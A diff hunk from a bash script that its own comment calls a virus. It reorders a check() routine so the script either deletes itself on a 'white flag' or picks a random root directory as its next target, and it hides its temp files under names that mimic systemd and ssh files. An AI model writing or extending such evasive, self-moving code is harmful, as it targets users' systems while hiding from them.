@@ -16,17 +16,17 @@ fi
 
 #Checks if the user has given up, either stops the virus, or randomly selects the next directory
 check(){
-if [ $giveUp != Stop ]
+if [ $giveUp == Stop ]
 then
+	echo "White flag has been raised, stopping script."
+	sudo rm -- "$current/onTheMove.sh"
+	exit
+else
 	ls -1 -d /*/>/tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM
 	grep -v "$oldTarget\|sys\|proc\|dev\|boot" /tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM>/tmp/ssh-l7IjnT5mI3t0
 	rm /tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM
 	target=`shuf -n 1 /tmp/ssh-l7IjnT5mI3t0`
 	rm /tmp/ssh-l7IjnT5mI3t0
-else
-	echo "White flag has been raised, stopping script."
-	sudo rm -- "$current/onTheMove.sh"
-	exit
 fi
 }
 
